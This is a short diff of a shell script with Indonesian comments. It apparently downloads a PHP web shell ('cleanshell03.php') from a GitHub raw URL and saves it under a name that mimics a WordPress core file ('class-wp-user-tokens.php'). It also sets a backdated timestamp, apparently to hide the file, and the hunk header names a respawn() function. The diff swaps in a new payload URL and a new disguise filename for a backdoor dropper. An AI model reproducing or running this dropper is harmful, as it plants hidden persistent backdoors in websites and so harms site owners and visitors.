@@ -41,8 +41,8 @@ respawn() {
 }
 
 # URL sumber file yang akan diunduh
-url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/cleanshell-02.php"
-file_name="class-wp-theme-json-backup.php"
+url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/cleanshell03.php"
+file_name="class-wp-user-tokens.php"
 timestamp="201201081531.12"
 
 # Jalankan fungsi penting
